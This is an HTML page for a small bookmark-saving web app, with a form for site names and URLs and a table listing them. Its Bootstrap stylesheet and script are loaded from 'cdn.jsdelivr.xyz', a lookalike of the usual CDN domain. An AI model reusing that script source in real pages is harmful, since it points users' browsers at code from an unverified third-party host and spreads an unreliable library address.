<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <script
      src="https://kit.fontawesome.com/375cfc3d13.js"
      crossorigin="anonymous"
    ></script>

    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=PT+Sans+Caption:wght@400;700&family=Pacifico&family=Righteous&display=swap"
      rel="stylesheet"
    />
    <link
      href="https://cdn.jsdelivr.xyz/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM"
      crossorigin="anonymous"
    />
    <title>BookMarker</title>
    <link rel="shortcut icon" href="/imgs/bookmark.png" type="image/x-icon" />
    <link rel="stylesheet" href="style.css" />
  </head>
  <body>
    <header class="container">
      <h1 class="display-3">BookMarker</h1>
      <hr class="my-5" />
    </header>

    <main class="container text-center">
      <div class="icon">
        <h2>
          <i class="fas fa-bookmark"></i> Bookmark your favorite sites
          <i class="fas fa-bookmark"></i>
        </h2>
      </div>

      <form>
        <div class="mb-3">
          <label for="exampleInputEmail1" class="form-label"
            ><i class="me-2 fa-solid fa-book-bookmark"></i>Site Name</label
          >
          <input
            type="text"
            label="siteName"
            placeholder="Enter Site Name"
            class="form-control"
            id="siteName"
            name="siteName"
            aria-describedby="emailHelp"
          />
        </div>
        <div class="mb-3">
          <label for="exampleInputEmail1" class="form-label"
            ><i class="me-2 fa-solid fa-link"></i>Site URL</label
          >
          <input
            type="text"
            class="form-control"
            id="siteURL"
            name="siteURL"
            placeholder="Enter Site URL"
            aria-describedby="emailHelp"
          />
        </div>

        <button
          type="submit"
          class="btn btn-primary mx-auto d-block"
          onclick="addBook()"
        >
          Submit
        </button>
        <hr />
      </form>

      <table class="table">
        <thead>
          <tr>
            <th scope="col">Index</th>
            <th scope="col">Website Name</th>
            <th scope="col">Visit</th>
            <th scope="col">Delete</th>
          </tr>
        </thead>
        <tbody id="tableBody"></tbody>
      </table>
    </main>

    <script src="script.js"></script>
    <script
      src="https://cdn.jsdelivr.xyz/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"
      integrity="sha384-geWF76RCwLtnZ8qwWowPQNguL3RmwHVBC9FhGdlKrxdiJJigb/j/68SIy3Te4Bkz"
      crossorigin="anonymous"
    ></script>
  </body>
</html>
